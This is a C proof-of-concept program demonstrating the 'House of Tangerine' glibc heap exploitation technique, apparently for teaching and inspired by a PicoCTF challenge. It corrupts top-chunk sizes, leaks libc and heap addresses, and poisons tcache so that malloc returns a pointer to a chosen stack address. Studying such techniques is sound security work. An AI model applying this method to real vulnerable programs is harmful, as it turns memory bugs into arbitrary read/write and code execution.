#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/syscall.h>

#define HEADER 0x10
#define SIZE_1 (0x100-HEADER)
#define SIZE_2 (0xee0-HEADER)
#define SIZE_3 (0x80-HEADER)

/**
 * House of Tangerine abuses a _int_free call to the top chunk in sysmalloc 
 * to corrupt heap without needing to call free() directly
 * additionally this version doesn't require the modification of previous chunks 
 *
 * Special Thanks to pepsipu for creating the challenge "High Frequency Trading"
 * from Pico CTF 2024 that inspired this exploitation technique
 */
int main()
{
  // disable buffering
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stdin, NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  uint64_t top_size, new_top_size, *heap_ptr, target;
  char win[0x10] = "WIN\0";
  
  // first allocation 
  heap_ptr = malloc(SIZE_1); 

  // use BOF or OOB to corrupt to the top heap chunk
  top_size = heap_ptr[(SIZE_1/sizeof(uint64_t))+1];
  printf("first top size = 0x%llx\n", top_size);
  new_top_size = top_size&0xfff;

  heap_ptr[(SIZE_1/sizeof(uint64_t))+1] = new_top_size;
  printf("new first top size = 0x%llx\n", new_top_size);

  // create large alloc (large than new top size), to free previous top chunk without free.
  // This happens inside sysmalloc, where the top chunk get's freed if it can't be merged
  // we prevent the top chunk from being merged by lowering it's size 
  // we can also circumvent some corruption checks by keeping the LSB unchanged

  // create two tcache bins for SIZE_1, in order to use tcache poisoning
  for (int i = 0; i < 2; ++i) {
    heap_ptr = malloc(SIZE_2);

    top_size = heap_ptr[(SIZE_2/sizeof(uint64_t))+1];
    printf("current top size = 0x%llx\n", top_size);
    new_top_size = top_size&0xfff;
    heap_ptr[(SIZE_2/sizeof(uint64_t))+1] = new_top_size;
    printf("new top size = 0x%llx\n", new_top_size);
  }

  // free the previous top chunk 
  malloc(SIZE_2);

  // this will be our target for tcache poisoning
  target = (int64_t) &heap_ptr[(SIZE_2/sizeof(uint64_t))+2];

  // allocate less then the unsorted bin (created by the first top chunk),
  // but not SIZE_1 (circumvent prepared tcaches) in order to get leaks
  uint64_t heap_leak, libc_leak;
  heap_ptr = malloc(SIZE_3);

  libc_leak = heap_ptr[0];
  heap_leak = heap_ptr[2] & 0xfffffffffffff000;
  printf("libc leak: 0x%llx\nheap leak: 0x%llx\n", libc_leak, heap_leak);

  // allocate again into unsorted bin in order to start tcache poisoning
  heap_ptr = malloc(SIZE_3);
  assert(heap_ptr < target);
  
  // corrupt next ptr into pointing to win 
  heap_ptr[(target-(uint64_t)heap_ptr)/8] = (uint64_t)&win;

  // allocate first tcache (corrupt next tcache bin)
  heap_ptr = malloc(SIZE_1);
  // get arbitary ptr for reads or writes 
  heap_ptr = malloc(SIZE_1);

  // proof that heap_ptr now points to the same string as win
  printf("%s\n", heap_ptr);
  assert(heap_ptr == win);
}